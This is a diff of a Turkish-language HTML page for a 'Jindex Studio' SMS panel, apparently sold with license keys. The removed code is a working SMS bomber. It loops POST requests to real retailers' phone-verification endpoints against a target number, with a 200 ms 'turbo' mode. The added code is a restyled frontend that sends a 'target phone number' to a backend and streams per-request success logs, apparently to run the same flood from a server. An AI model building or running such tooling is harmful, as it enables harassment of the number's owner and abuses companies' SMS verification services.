@@ -3,160 +3,166 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>JINDEX STUDIO - SMS PANEL 2026</title>
+    <title>Jindex Studio | Sunucu Paneli</title>
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700&display=swap" rel="stylesheet">
+    <script src="https://cdn.jsdelivr.net/npm/@tailwindcss/browser@4"></script>
     <style>
         body {
-            background-color: #0a0a0a;
-            color: #00ffcc;
-            font-family: 'Courier New', Courier, monospace;
-            display: flex;
-            justify-content: center;
-            align-items: center;
-            height: 100vh;
-            margin: 0;
+            font-family: 'Inter', sans-serif;
+            background-color: #0b0c0e;
         }
-        .container {
-            background-color: #111;
-            border: 2px solid #00ffcc;
-            padding: 30px;
-            box-shadow: 0 0 15px #00ffcc;
-            border-radius: 8px;
-            width: 400px;
-            text-align: center;
+        ::-webkit-scrollbar {
+            width: 6px;
         }
-        h1 { color: #ff0055; font-size: 24px; margin-bottom: 20px; text-shadow: 0 0 5px #ff0055; }
-        input, select, button {
-            width: 100%;
-            padding: 10px;
-            margin: 10px 0;
-            background: #000;
-            border: 1px solid #00ffcc;
-            color: #fff;
-            box-sizing: border-box;
-            font-family: monospace;
+        ::-webkit-scrollbar-track {
+            background: #16181c;
         }
-        button {
-            background: #ff0055;
-            color: #fff;
-            border: none;
-            cursor: pointer;
-            font-weight: bold;
-            transition: 0.3s;
+        ::-webkit-scrollbar-thumb {
+            background: #2c3036;
+            border-radius: 10px;
         }
-        button:hover { background: #00ffcc; color: #000; box-shadow: 0 0 10px #00ffcc; }
-        #log {
-            height: 150px;
-            background: #000;
-            border: 1px solid #333;
-            margin-top: 15px;
-            overflow-y: scroll;
-            padding: 10px;
-            text-align: left;
-            font-size: 12px;
-            color: #aaa;
+        .fade-in {
+            animation: fadeIn 0.6s ease-out forwards;
         }
-        .success { color: #00ff00; }
-        .fail { color: #ff0000; }
+        .slide-up {
+            animation: slideUp 0.4s ease-out forwards;
+        }
+        @keyframes fadeIn {
+            from { opacity: 0; transform: scale(0.98); }
+            to { opacity: 1; transform: scale(1); }
+        }
+        @keyframes slideUp {
+            from { opacity: 0; transform: translateY(10px); }
+            to { opacity: 1; transform: translateY(0); }
+        }
     </style>
 </head>
-<body>
+<body class="text-zinc-200 min-h-screen flex items-center justify-center p-4 selection:bg-zinc-700 selection:text-white">
 
-<div class="container">
-    <h1>JINDEX STUDIO SMS SYSTEM</h1>
-    <input type="text" id="key" placeholder="Ürün Anahtarını Girin">
-    <input type="text" id="phone" placeholder="Telefon No (Örn: 5051234567)">
-    
-    <select id="mode">
-        <option value="1">Standart Gönderim</option>
-        <option value="2">TURBO MOD</option>
-    </select>
-
-    <button id="startBtn" onclick="startProcess()">SİSTEMİ BAŞLAT</button>
-    
-    <div id="log">>> Sistem hazır. Anahtar girip başlatın...</div>
-</div>
-
-<script>
-const LICENSE_KEYS = {
-    "JINDEX-PREM-2026-X7K9": "prem",
-    "JINDEX-ULTRA-2026-4M2P": "ultra",
-    "JINDEX-DENEME-2026-TEST": "deneme"
-};
-
-let isRunning = false;
-
-function logMessage(msg, type="") {
-    const logDiv = document.getElementById("log");
-    let colorClass = type === "success" ? "success" : (type === "fail" ? "fail" : "");
-    logDiv.innerHTML += `<div class="${colorClass}">[+] ${msg}</div>`;
-    logDiv.scrollTop = logDiv.scrollHeight;
-}
-
-async function sendBim(phone) {
-    try {
-        let r = await fetch("https://bim.veesk.net/service/v1.0/account/login", {
-            method: "POST",
-            headers: { "Content-Type": "application/json" },
-            body: JSON.stringify({ phone: phone })
-        });
-        if(r.status === 200) logMessage(`${phone} --> bim.veesk.net`, "success");
-        else throw new Error();
-    } catch { logMessage(`${phone} --> bim.veesk.net Başarısız`, "fail"); }
-}
-
-async function sendKahveDunyasi(phone) {
-    try {
-        let r = await fetch("https://api.kahvedunyasi.com/api/v1/auth/account/register/phone-number", {
-            method: "POST",
-            headers: { "Content-Type": "application/json" },
-            body: JSON.stringify({ countryCode: "90", phoneNumber: phone })
-        });
-        let json = await r.json();
-        if(json.processStatus === "Success") logMessage(`${phone} --> kahvedunyasi.com`, "success");
-        else throw new Error();
-    } catch { logMessage(`${phone} --> kahvedunyasi.com Başarısız`, "fail"); }
-}
-
-// Diğer API'leri de buraya aynı mantıkla ekleyebilirsin.
-
-async function startProcess() {
-    const key = document.getElementById("key").value.trim();
-    const phone = document.getElementById("phone").value.trim();
-    const mode = document.getElementById("mode").value;
-    
-    if (!LICENSE_KEYS[key]) {
-        alert("HATALI ÜRÜN ANAHTARI!");
-        return;
-    }
-
-    if (phone.length !== 10) {
-        alert("Telefon numarası 10 haneli olmalıdır!");
-        return;
-    }
-
-    if(isRunning) {
-        isRunning = false;
-        document.getElementById("startBtn").innerText = "SİSTEMİ BAŞLAT";
-        logMessage("Sistem durduruldu.");
-        return;
-    }
-
-    isRunning = true;
-    document.getElementById("startBtn").innerText = "DURDUR";
-    logMessage("Gönderim başlatıldı...");
-
-    while(isRunning) {
-        await sendBim(phone);
-        await sendKahveDunyasi(phone);
+    <div class="fade-in max-w-md w-full bg-[#121418] border border-zinc-800/60 rounded-2xl p-6 shadow-2xl shadow-black/40">
         
-        if(mode === "1") {
-            await new Promise(r => setTimeout(r, 2000)); // Standart modda bekler
-        } else {
-            await new Promise(r => setTimeout(r, 200));  // Turbo modda çok hızlı döner
-        }
-    }
-}
-</script>
+        <div class="text-center mb-8">
+            <h1 class="text-xl font-semibold tracking-wide text-white">JINDEX STUDIO</h1>
+            <p class="text-xs text-zinc-500 mt-1 uppercase tracking-widest font-medium">SMS Request System v2026</p>
+        </div>
 
+        <div class="space-y-4">
+            <div>
+                <label class="block text-xs font-medium text-zinc-400 mb-1.5 ml-1">Hedef Telefon Numarası</label>
+                <input type="text" id="phoneInput" placeholder="5xxxxxxxx" maxlength="10"
+                       class="w-full bg-[#181a20] border border-zinc-800 focus:border-zinc-600 rounded-xl px-4 py-3 text-sm text-white placeholder-zinc-600 outline-none transition-all duration-300 tracking-wider">
+            </div>
+
+            <button id="startBtn" onclick="startProcess()"
+                    class="w-full bg-zinc-100 hover:bg-white text-zinc-950 font-medium text-sm py-3 px-4 rounded-xl transition-all duration-300 cursor-pointer shadow-lg shadow-white/5 active:scale-[0.99]">
+                Sistemi Başlat
+            </button>
+        </div>
+
+        <div id="monitorArea" class="hidden mt-8 border-t border-zinc-800/80 pt-6">
+            <div class="flex items-center justify-between mb-3 px-1">
+                <span class="text-xs font-semibold tracking-wider text-zinc-400 uppercase flex items-center gap-2">
+                    <span class="w-2 h-2 rounded-full bg-emerald-500 animate-pulse"></span>
+                    Canlı İzleme Monitörü
+                </span>
+                <span id="loader" class="text-[11px] text-zinc-500 font-medium animate-pulse">İstekler gönderiliyor...</span>
+            </div>
+
+            <div id="logConsole" class="w-full h-48 bg-[#181a20] border border-zinc-800/50 rounded-xl p-3 overflow-y-auto space-y-2 flex flex-col">
+            </div>
+        </div>
+
+        <div class="mt-8 text-center">
+            <p class="text-[10px] text-zinc-600 font-medium tracking-wide">&copy; 2026 Jindex Studio. Tüm hakları saklıdır.</p>
+        </div>
+
+    </div>
+
+    <script>
+        function startProcess() {
+            const phoneInput = document.getElementById("phoneInput");
+            const startBtn = document.getElementById("startBtn");
+            const monitorArea = document.getElementById("monitorArea");
+            const logConsole = document.getElementById("logConsole");
+            const loader = document.getElementById("loader");
+
+            if (phoneInput.value.length !== 10) {
+                alert("Lütfen numarayı başında 0 olmadan 10 hane olarak girin.");
+                return;
+            }
+
+            // Arayüz kilitleme ve hazırlık
+            startBtn.disabled = true;
+            startBtn.classList.add("opacity-50", "cursor-not-allowed");
+            phoneInput.disabled = true;
+            logConsole.innerHTML = ""; 
+            monitorArea.classList.remove("hidden");
+            loader.innerText = "İstekler gönderiliyor...";
+
+            // Python Flask API'ye tetikleyici gönderiyoruz
+            fetch("/api/start", {
+                method: "POST",
+                headers: { "Content-Type": "application/json" },
+                body: JSON.stringify({ phone: phoneInput.value })
+            })
+            .then(res => res.json())
+            .then(data => {
+                if (data.error) {
+                    alert(data.error);
+                    resetUI();
+                    return;
+                }
+                
+                // Flask sunucusundan canlı Server-Sent Events (SSE) yayınını dinle
+                const eventSource = new EventSource(`/api/stream/${data.task_id}`);
+                
+                eventSource.onmessage = function(event) {
+                    const logData = JSON.parse(event.data);
+                    
+                    if (logData.status === "ping") {
+                        return; // Bağlantı canlılık kontrolü pas geçilir
+                    }
+
+                    if (logData.status === "done") {
+                        eventSource.close();
+                        loader.innerText = "Tamamlandı";
+                        loader.classList.remove("animate-pulse");
+                        loader.classList.add("text-emerald-400");
+                        resetUI();
+                    } else {
+                        const logRow = document.createElement("div");
+                        logRow.className = "slide-up text-xs font-mono py-1 px-2.5 rounded-md flex items-center justify-between transition-all duration-300";
+                        
+                        if (logData.status === "success") {
+                            logRow.className += " bg-zinc-900/40 text-emerald-400 border-l-2 border-emerald-500";
+                        } else {
+                            logRow.className += " bg-zinc-950/20 text-rose-500 border-l-2 border-rose-800";
+                        }
+                        
+                        logRow.innerText = logData.msg;
+                        logConsole.appendChild(logRow);
+                        
+                        // Otomatik Smooth Scroll aşağı kaydırma
+                        logConsole.scrollTo({
+                            top: logConsole.scrollHeight,
+                            behavior: 'smooth'
+                        });
+                    }
+                };
+            })
+            .catch(err => {
+                alert("Sistem hatası oluştu.");
+                resetUI();
+            });
+        }
+
+        function resetUI() {
+            document.getElementById("startBtn").disabled = false;
+            document.getElementById("startBtn").classList.remove("opacity-50", "cursor-not-allowed");
+            document.getElementById("phoneInput").disabled = false;
+        }
+    </script>
 </body>
 </html>
